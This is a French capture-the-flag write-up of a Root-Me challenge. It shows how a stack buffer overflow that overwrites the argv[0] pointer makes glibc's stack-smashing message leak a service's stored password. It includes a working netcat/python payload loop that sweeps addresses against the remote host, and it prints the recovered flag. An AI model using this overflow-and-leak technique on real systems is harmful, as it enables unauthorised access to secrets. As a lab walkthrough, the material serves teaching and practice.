## ELF x86 - Information leakage with Stack Smashing Protector

Dans ce challenge nous devons réussir à leak le mot de passe de validation d'un service distant, uniquement à partir des messages d'erreur du Stack Smashing Protector.

Le service attend un mot de passe :

```bash
nc challenge03.root-me.org 56529
# Enter password to access this service: password
# Access refused! Bye ...
```

## Atteindre le canary

En envoyant un buffer volumineux, on finit par écraser le canary et le SSP se déclenche :

```
*** stack smashing detected ***: ch29 terminated
```

Le point intéressant, c'est le nom affiché par le message : `ch29`. Sur glibc, le SSP affiche l'argument pointé par `__libc_argv[0]` — une **adresse** stockée sur la pile. Si on continue de remplir le buffer, on écrase ce pointeur et le nom disparaît du message :

```
*** stack smashing detected ***: terminated
```

En analysant méticuleusement les offsets, on constate qu'à partir de **440 octets**, l'argument affiché par le SSP disparaît : on contrôle donc le pointeur utilisé pour l'affichage.

## L'idée : détourner le pointeur d'affichage

Puisque le SSP affiche la chaîne pointée par ce pointeur, il suffit de le remplacer par l'adresse du **mot de passe de validation** stocké dans le binaire. La chaîne sera alors imprimée à notre place dans le message d'erreur.

Par défaut, le binaire ELF (non-PIE) est mappé sur la plage `0x08048000` – `0x08048fff`. On ne connaît pas l'adresse exacte de la chaîne, mais l'espace de recherche est petit : on balaye l'octet de poids faible de l'adresse cible dans cette plage.

Attention : le service bannit temporairement en cas de tentatives trop rapides — il faut y aller progressivement.

```bash
# On fait varier l'octet de poids faible de l'adresse pointée (dans la plage du binaire)
for i in {0..280}; do
  python2 -c "print 'a' * 440 + '\x'$(printf '%02x' $((0x08 + i)))'\xd7\x04\x08'" \
    | nc challenge03.root-me.org 56529 | grep -A1 'stack smashing'
done
```

## Résultat

À mesure que l'adresse pointée glisse dans la chaîne stockée en mémoire, le SSP en révèle des morceaux successifs :

```
*** stack smashing detected ***: Auth0r!z3dP3rSon4l0nLY terminated
*** stack smashing detected ***: uth0r!z3dP3rSon4l0nLY terminated
*** stack smashing detected ***: th0r!z3dP3rSon4l0nLY terminated
...
```

Le mot de passe de validation fuit ainsi entièrement, un octet à la fois.

## Flag

```
Auth0r!z3dP3rSon4l0nLY
```

## Points clés

- Le message du SSP affiche une **chaîne pointée par une adresse sur la pile** — cette adresse est un vecteur de fuite si on la contrôle.
- Sur un binaire non-PIE, la plage d'adresses mappées est fixe et étroite (`0x08048000`–`0x08048fff`), ce qui rend le balayage praticable.
- Le service bannit sur trop de connexions rapides : le brute-force doit rester mesuré.
